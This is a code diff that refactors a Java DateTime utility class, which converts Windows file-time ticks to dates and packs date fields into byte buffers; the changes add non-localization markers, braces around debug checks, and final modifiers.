@@ -13,6 +13,7 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 
 // TODO: Auto-generated Javadoc
@@ -21,7 +22,7 @@ import com.android.service.auto.Cfg;
  */
 public final class DateTime {
 	/** The debug. */
-	private static final String TAG = "DateTime";
+	private static final String TAG = "DateTime"; //$NON-NLS-1$
 	/** The Constant TICK. */
 	public static final long TICK = 1; // 100 nano secondi
 
@@ -93,8 +94,12 @@ public final class DateTime {
 	 */
 	public Date getDate() {
 		final Date ldate = new Date((ticks - TICSK_FROM_1601_TO_1970) / MILLISEC);
-		if(Cfg.DEBUG) Check.ensures(ldate.getTime() == date.getTime(), "Wrong getTime()");
-		if(Cfg.DEBUG) Check.ensures((new DateTime(ldate)).getFiledate() == ticks, "Wrong date");
+		if (Cfg.DEBUG) {
+			Check.ensures(ldate.getTime() == date.getTime(), "Wrong getTime()"); //$NON-NLS-1$
+		}
+		if (Cfg.DEBUG) {
+			Check.ensures((new DateTime(ldate)).getFiledate() == ticks, "Wrong date"); //$NON-NLS-1$
+		}
 		return date;
 	}
 
@@ -119,10 +124,12 @@ public final class DateTime {
 	 * @return the struct tm
 	 */
 	public synchronized byte[] getStructTm() {
-		if(Cfg.DEBUG) Check.requires(date != null, "getStructTm date != null");
+		if (Cfg.DEBUG) {
+			Check.requires(date != null, "getStructTm date != null"); //$NON-NLS-1$
+		}
 		final int tm_len = 9 * 4;
 
-		byte[] buffer = new byte[tm_len];
+		final byte[] buffer = new byte[tm_len];
 		final DataBuffer databuffer = new DataBuffer(buffer, 0, tm_len);
 
 		final Calendar calendar = Calendar.getInstance();
@@ -154,7 +161,7 @@ public final class DateTime {
 	 * @return the ordered string
 	 */
 	public String getOrderedString() {
-		final SimpleDateFormat format = new SimpleDateFormat("yyMMdd-HHmmss");
+		final SimpleDateFormat format = new SimpleDateFormat("yyMMdd-HHmmss"); //$NON-NLS-1$
 		return format.format(date);
 	}
 
@@ -207,8 +214,8 @@ public final class DateTime {
 	 */
 	public byte[] getStructSystemdate() {
 		final int size = 16;
-		byte[] output = new byte[size];
-		DataBuffer databuffer = new DataBuffer(output);
+		final byte[] output = new byte[size];
+		final DataBuffer databuffer = new DataBuffer(output);
 
 		final Calendar calendar = Calendar.getInstance();
 		calendar.setTime(date);
@@ -224,7 +231,9 @@ public final class DateTime {
 		databuffer.writeShort((short) calendar.get(Calendar.SECOND));
 		databuffer.writeShort((short) calendar.get(Calendar.MILLISECOND));
 
-		if(Cfg.DEBUG) Check.ensures(output.length == size, "getStructSystemdate wrong size");
+		if (Cfg.DEBUG) {
+			Check.ensures(output.length == size, "getStructSystemdate wrong size"); //$NON-NLS-1$
+		}
 		return output;
 	}
 
